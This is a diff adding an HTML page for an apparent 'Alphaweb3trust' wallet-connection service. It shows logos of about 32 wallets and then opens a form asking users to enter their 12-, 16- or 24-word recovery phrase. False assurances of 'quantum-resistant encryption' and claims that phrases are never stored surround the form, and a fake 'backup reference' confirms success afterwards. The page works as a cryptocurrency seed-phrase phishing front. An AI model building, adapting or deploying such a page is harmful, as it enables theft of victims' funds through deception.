@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallets - Alphaweb3trust-chain Enterprise Platform</title>
+
+    <meta name="description" content="Securely connect your cryptocurrency wallet using military-grade quantum encryption and end-to-end security protocols. Support for 30+ wallets.">
+    <link rel="icon" href="https://i.imgur.com/u2pTfGx.png">
+
+    <link rel="stylesheet" href="/css/main.css">
+    <link rel="stylesheet" href="/css/wallet.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="language-selector" id="languageSelector">
+        <button class="language-btn" id="languageBtn">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="2" y1="12" x2="22" y2="12"></line>
+                <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
+            </svg>
+            <span id="currentLang">EN</span>
+        </button>
+    </div>
+
+    <div class="language-modal" id="languageModal">
+        <div class="language-modal-content">
+            <div class="language-modal-header">
+                <h3>Select Your Region</h3>
+                <button class="close-btn" id="closeLanguageModal">&times;</button>
+            </div>
+            <div class="language-grid">
+                <button class="language-option" data-lang="en">
+                    <span class="flag">🇺🇸</span>
+                    <span class="lang-name">English</span>
+                </button>
+                <button class="language-option" data-lang="es">
+                    <span class="flag">🇪🇸</span>
+                    <span class="lang-name">Español</span>
+                </button>
+                <button class="language-option" data-lang="fr">
+                    <span class="flag">🇫🇷</span>
+                    <span class="lang-name">Français</span>
+                </button>
+                <button class="language-option" data-lang="de">
+                    <span class="flag">🇩🇪</span>
+                    <span class="lang-name">Deutsch</span>
+                </button>
+                <button class="language-option" data-lang="zh">
+                    <span class="flag">🇨🇳</span>
+                    <span class="lang-name">中文</span>
+                </button>
+                <button class="language-option" data-lang="ja">
+                    <span class="flag">🇯🇵</span>
+                    <span class="lang-name">日本語</span>
+                </button>
+                <button class="language-option" data-lang="ko">
+                    <span class="flag">🇰🇷</span>
+                    <span class="lang-name">한국어</span>
+                </button>
+                <button class="language-option" data-lang="ru">
+                    <span class="flag">🇷🇺</span>
+                    <span class="lang-name">Русский</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <a href="/" class="logo">
+                   <img src="https://i.imgur.com/u2pTfGx.png" height="60px" width="70px" alt="">
+                    <span class="logo-text">ALPHAWEB3TRUST</span>
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <section class="connect-section">
+            <div class="connect-bg"></div>
+
+            <div class="container">
+                <div class="connect-intro">
+                    <h1 class="connect-title">Secure Wallet Integration</h1>
+                    <p class="connect-description">
+                        Connect your cryptocurrency wallet securely using military-grade encryption protocols. Our platform supports over 30 major wallets across all blockchain networks, enabling seamless recovery and transaction resolution.
+                    </p>
+                    <p class="connect-security">
+                        All connections are protected by quantum-resistant encryption algorithms and end-to-end security. Your recovery phrases are never stored on our servers, remaining encrypted throughout the entire process. Your private keys remain on your device with zero exposure to external networks.
+                    </p>
+                </div>
+
+                <div class="wallets-section">
+                    <h2 class="wallets-title">Select Your Wallet Provider</h2>
+                    <p class="wallets-subtitle">Click your wallet to begin the secure connection process</p>
+
+                    <div class="wallets-grid">
+                        <div class="wallet-card" data-wallet="Trust Wallet">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/G50mEbf.png" alt="Trust Wallet">
+                            </div>
+                            <span class="wallet-name">Trust Wallet</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Coinbase Wallet">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/cSpD9EA.png" alt="Coinbase Wallet">
+                            </div>
+                            <span class="wallet-name">Coinbase Wallet</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Blockchain">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/i1IikLA.png" alt="Blockchain">
+                            </div>
+                            <span class="wallet-name">Blockchain</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Exodus">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/BYnELnT.jpeg" alt="Exodus">
+                            </div>
+                            <span class="wallet-name">Exodus</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="MetaMask">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/tCeEDFJ.png" alt="MetaMask">
+                            </div>
+                            <span class="wallet-name">Meta Mask</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Electrum">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/qNWkcEJ.png" alt="Electrum">
+                            </div>
+                            <span class="wallet-name">Electrum</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="MyEtherWallet">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/bcPRnrB.jpeg" alt="MyEtherWallet">
+                            </div>
+                            <span class="wallet-name">MyEtherWallet</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="D'CENT Wallet">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/pI2hHSP.png" alt="D'CENT Wallet">
+                            </div>
+                            <span class="wallet-name">D'CENT Wallet</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="imToken">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/5Ai5zRC.png" alt="imToken">
+                            </div>
+                            <span class="wallet-name">im Token</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Atomic Wallet">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/mBJA3yq.png" alt="Atomic Wallet">
+                            </div>
+                            <span class="wallet-name">Atomic Wallet</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Coinomi">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/hb0YjlO.png" alt="Coinomi">
+                            </div>
+                            <span class="wallet-name">Coinomi</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="O3 Wallet">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/vppLq1x.png" alt="O3 Wallet">
+                            </div>
+                            <span class="wallet-name">O3 Wallet</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="SafePal">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/OQpLCDI.png" alt="SafePal">
+                            </div>
+                            <span class="wallet-name">SafePal</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="MathWallet">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/zy4sbbq.png" alt="MathWallet">
+                            </div>
+                            <span class="wallet-name">MathWallet</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Vision">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/3R0f3Vo.jpeg" alt="Vision">
+                            </div>
+                            <span class="wallet-name">Vision</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Ownbit">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/yDhpZm8.png" alt="Ownbit">
+                            </div>
+                            <span class="wallet-name">Ownbit</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Bitpie">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/7ayt6Dr.png" alt="Bitpie">
+                            </div>
+                            <span class="wallet-name">Bitpie</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="TokenPocket">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/JdqE8XU.png" alt="TokenPocket">
+                            </div>
+                            <span class="wallet-name">Token Pocket</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="BitPay">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/SqrBtjB.jpeg" alt="BitPay">
+                            </div>
+                            <span class="wallet-name">BitPay</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="LOBSTR">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/RcWlLGg.jpeg" alt="LOBSTR">
+                            </div>
+                            <span class="wallet-name">LOBSTR</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Phoenix Wallet">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/lpP5dXv.png" alt="Phoenix Wallet">
+                            </div>
+                            <span class="wallet-name">Phoenix Wallet</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Ledger">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/Ry6YCR5.png" alt="Ledger">
+                            </div>
+                            <span class="wallet-name">Ledger</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Trezor">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/esHrlyO.png" alt="Trezor">
+                            </div>
+                            <span class="wallet-name">Trezor</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Tangem">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/YwY8iIL.png" alt="Tangem">
+                            </div>
+                            <span class="wallet-name">Tangem</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Bybit Wallet">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/onfKe4S.png" alt="Bybit Wallet">
+                            </div>
+                            <span class="wallet-name">Bybit Wallet</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Binance">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/0aXdZi6.png" alt="Binance">
+                            </div>
+                            <span class="wallet-name">Binance</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="SOLO DEX">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/GDnvXpp.png" alt="SOLO DEX">
+                            </div>
+                            <span class="wallet-name">SOLO DEX</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Xaman">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/0CrVftP.png" alt="Xaman">
+                            </div>
+                            <span class="wallet-name">Xaman</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Yoroi Wallet">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/2SyBYxf.png" alt="Yoroi Wallet">
+                            </div>
+                            <span class="wallet-name">Yoroi Wallet</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="ELLIPAL">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/KpESl7I.png" alt="ELLIPAL">
+                            </div>
+                            <span class="wallet-name">ELLIPAL</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Solana Blockchain">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/FWLqIJK.png" alt="Solana Blockchain">
+                            </div>
+                            <span class="wallet-name">Solana Blockchain</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Ethereum Blockchain">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/pVtDfWr.png" alt="Ethereum Blockchain">
+                            </div>
+                            <span class="wallet-name">Ethereum Blockchain</span>
+                        </div>
+                        <div class="wallet-card" data-wallet="Other Wallets">
+                            <div class="wallet-logo-slot">
+                                <img src="https://i.imgur.com/5Jloq0G.png" alt="Other Wallets">
+                            </div>
+                            <span class="wallet-name">Other Wallets</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <a href="#" class="footer-link">Terms & Conditions</a>
+                <span class="footer-divider">|</span>
+                <a href="#" class="footer-link">Privacy Policy</a>
+            </div>
+        </div>
+    </footer>
+
+    <div class="modal" id="loadingModal">
+        <div class="modal-content modal-loading">
+            <div class="loading-container">
+                <div class="loading-spinner"></div>
+                <h3>Initializing Secure Connection</h3>
+                <p class="loading-text">Establishing encrypted channel...</p>
+                <p class="loading-notice">All data is being encrypted with quantum-resistant protocols. Your information remains completely private.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="phraseModal">
+        <div class="modal-content modal-phrase">
+            <div class="modal-header">
+                <h3>Import Recovery Phrase</h3>
+                <button class="close-btn" id="closePhraseModal">&times;</button>
+            </div>
+            <p class="phrase-instruction">Enter your seed phrase words. Press Enter after each word. Supports 12, 16, or 24-word phrases.</p>
+
+            <form id="phraseForm" class="phrase-form" action="">
+                <div class="phrase-input-wrapper">
+                    <div id="phraseDisplay" class="phrase-display"></div>
+                    <input type="text" id="phraseInput" class="phrase-input" placeholder="Type first word and press Enter..." autocomplete="off">
+                </div>
+
+                <div class="word-count-info">
+                    <span id="wordCount">0</span> / <span id="wordTarget">12-16-24</span> words
+                </div>
+
+                <div class="form-actions">
+                    <button type="button" class="btn btn-secondary" id="cancelPhraseBtn">Cancel</button>
+                    <button type="submit" class="btn btn-primary" id="proceedBtn" disabled>Verify & Proceed</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="modal" id="successModal">
+        <div class="modal-content modal-success">
+            <div class="success-animation">
+                <div class="success-checkmark">
+                    <svg viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="40" cy="40" r="38" stroke="#10B981" stroke-width="3" fill="none" stroke-dasharray="238" stroke-dashoffset="238" style="animation: drawCircle 1s ease-out forwards;"/>
+                        <path d="M22 40L35 53L58 30" stroke="#10B981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" stroke-dasharray="50" stroke-dashoffset="50" style="animation: drawCheck 0.6s ease-out 0.4s forwards;"/>
+                    </svg>
+                </div>
+            </div>
+
+            <h2>Wallet Connected Successfully</h2>
+            <p class="success-wallet-name" id="successWalletName">Trust Wallet imported and verified</p>
+
+            <div class="reference-container">
+                <p class="reference-label">Your Backup Reference</p>
+                <div class="reference-box">
+                    <span class="reference-number" id="referenceNumber">000000000000</span>
+                    <button type="button" class="copy-btn" id="copyRefBtn" title="Copy reference">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path>
+                            <rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect>
+                        </svg>
+                    </button>
+                </div>
+                <p class="reference-hint">Save this reference in a secure location for future verification</p>
+            </div>
+
+            <p class="success-footer">Secured by Quantum Financial Infrastructure</p>
+
+            <button class="btn btn-primary btn-full" id="okBtn">Return to Platform</button>
+        </div>
+    </div>
+
+    <script src="/js/main.js"></script>
+    <script src="/js/wallet.js"></script>
+</body>
+</html>
